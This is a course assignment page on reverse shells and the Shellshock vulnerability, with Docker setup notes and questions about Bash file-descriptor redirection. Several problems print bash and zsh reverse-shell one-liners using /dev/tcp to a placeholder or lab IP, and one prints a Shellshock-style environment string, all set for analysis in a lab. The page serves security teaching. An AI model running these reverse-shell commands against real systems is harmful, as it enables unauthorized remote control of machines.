---
layout: default
course_number: CS335
title: Assignment 1
---

# Assignment 1 – Reverse Shells and Shellshock
This assignment introduces students to the concepts behind reverse shells and the Shellshock vulnerability. The goal is to help students understand how file descriptors, redirection, and environment‑variable–based function imports interact with system behavior.

--- 
## Lab Environment and hints 
Setup files: Labsetup.zip
```bash 
curl -o Labsetup.zip https://ycpcs.github.io/cs335-spring2026/notes/shellshock/Labsetup.zip
unzip Labsetup.zip
```
---

## Docker Command Summary

### Build & Run Containers

#### `docker-compose build`
Builds the images defined in your `docker-compose.yml` file.

#### `docker-compose up`
Starts and runs the containers defined in the compose file (building them first if needed).

#### `docker-compose down`
Stops and removes all containers, networks, and resources created by `docker-compose up`.

### Inspect Running Containers

#### `docker ps`
Lists all currently running containers.

### Access a Running Container

#### `docker exec -it <container> /bin/bash`
Opens an interactive Bash shell inside the specified running container.

### Copy Files Between Host and Container

#### `docker cp file.txt bcff:/tmp/`
Copies `file.txt` from the host into `/tmp/` inside container `bcff`.

#### `docker cp folder bcff:/tmp`
Copies a folder from the host into `/tmp` inside the container.

### Copy Files Between Container and Host

#### `docker cp bcff:/tmp/file.txt .`
Copies `file.txt` from the container to the current host directory.

#### `docker cp bcff:/tmp/folder .`
Copies a folder from the container to the current host directory.

---

### Netcat
Netcat is a versatile network utility tool, and a quick reference guide is available at: [netcat_cheat_sheet](https://ycpcs.github.io/cs335-spring2026/resources/docs/netcat_cheat_sheet_v1.pdf)

---
## Part I — Reverse Shell Concepts
### Problem 1
Run the following command in a Bash shell:
```bash 
exec 5>/dev/null
```
Explain what happens to the current process after this command is executed.

### Problem 2
Consider the following code snippet:
```c
fd = open("/tmp/xyz", O_RDWR);
printf("File descriptor: %d\n", fd);
```
Suppose the output indicates that the file descriptor returned for `/tmp/xyz` is 0. Explain what might have caused this situation.

### Problem 3
To achieve the redirection performed by the command:
```bash
cat 1>&3
```
which system call is invoked:
- `dup2(1, 3)`  
or
- `dup2(3, 1)`?

Explain your reasoning.

### Problem 4
You want a program to receive input from another machine (Machine A, IP address 10.0.2.6) and send its output back to the same machine. After running:
```bash
nc -l 9090
```
on Machine A, you execute the following command on the local machine:
```bash 
/bin/cat 1>/dev/tcp/10.0.2.6/9090 0</dev/tcp/10.0.2.6/9090
```

Does this achieve the intended behavior? Explain why or why not. To support your explanation, complete the following tasks and include your observations:

- Inspect file descriptors using `/proc/$$/fd`
  - Before running the command, list the symbolic links in:

  - Run the command in another terminal and list the directory again.
  - Describe any new file descriptors that appear and what they point to.

- Use `netstat` (or `ss`) to examine network connections
  - While the command is running, use:

```bash 
netstat -tan
```

  - Identify the TCP connection(s) created by the `/dev/tcp/` redirections.
  - Explain how these connections relate to the behavior of the command.

### Problem 5
What is the result of running the following commands?
```bash 
exec 5>/tmp/xyz
echo hello >&5
```
Describe what happens and why.

### Problem 6
In the following program, the first `printf()` should print to the screen, while the second should print to the file `/tmp/xyz`:
```c
printf("%s\n", "message one");
...
printf("%s\n", "message two");
```
What should be done between these two lines to achieve the desired behavior?

### Problem 7
The commands below each use different combinations of Bash file‑descriptor redirection involving standard input (`0`), standard output (`1`), and standard error (`2`), along with `/dev/tcp/` for creating TCP connections. Your task is to analyze the redirection logic in each example and determine how the file descriptors are being rearranged. Replace `IP` with the appropriate address when reasoning about the redirections. 
```bash 
- /bin/bash -i >/dev/tcp/IP/9090 0<&1 2>&0
- /bin/bash -i >/dev/tcp/IP/9090 0<&1 2>&1
- /bin/bash -i >/dev/tcp/IP/9090 2>&1 0<&1
- /bin/bash -i 2>/dev/tcp/IP/9090 1>&2 0<&2
- /bin/bash -i 2>/dev/tcp/IP/9090 1>&2 0<&1
```

Describe whether the redirections form a consistent input/output flow.Note any inconsistencies or ordering issues in the redirection sequence.

### Problem 8
The `/dev/tcp` virtual file is not provided by the Linux kernel; it is a feature implemented by the **Bash** shell. Other shells, such as `zsh`, do not interpret `/dev/tcp` unless they implement compatible extensions. Consider the following commands, each invoking a different shell to execute a subshell that attempts to use `/dev/tcp/` redirection:
```bash
- /bin/zsh -c "/bin/zsh -i > /dev/tcp/IP/9090 0<&1 2>&1"
- /bin/zsh -c "/bin/bash -i > /dev/tcp/IP/9090 0<&1 2>&1"
- /bin/bash -c "/bin/zsh -i > /dev/tcp/IP/9090 0<&1 2>&1"
- /bin/bash -c "/bin/bash -i > /dev/tcp/IP/9090 0<&1 2>&1"
```
For each command: 
- Identify which shell is responsible for interpreting the `/dev/tcp` syntax.
- Explain whether the invoked shell supports `/dev/tcp`.
- Describe how this affects the behavior of the command.
- Summarize which commands result in valid `/dev/tcp` redirection and which do not.
  
---

## Part II — Shellshock Vulnerability

### Problem 1
For the Shellshock vulnerability to be exploitable, two conditions must be met. Identify and explain these two conditions.

### Problem 2
Consider the following environment variable assignment:
``` bash
export foo='echo world; () { echo hello; }'
```
Assuming the system is running a version of Bash vulnerable to Shellshock, will the command echo world be executed when Bash starts? Explain why or why not.

### Problem 3
Machine 1 (IP 10.0.2.6) runs:
```bash 
nc -l 7070
```
Machine 2 then runs:
```bash 
/bin/cat < /dev/tcp/10.0.2.6/7070 >&0
```
Describe what will happen as a result of this command.

### Problem 4
Explain what the following two lines of code do, respectively:
```c
read(5, data, 100);
write(3, data, 100);
```

### Problem 5
Open two terminal windows in Ubuntu and list the contents of the `/dev/fd` directory in each. Explain why the two windows show different results.
(Hint: `/dev/fd` is a symbolic link to `/proc/self/fd`, and `self` refers to the current process.)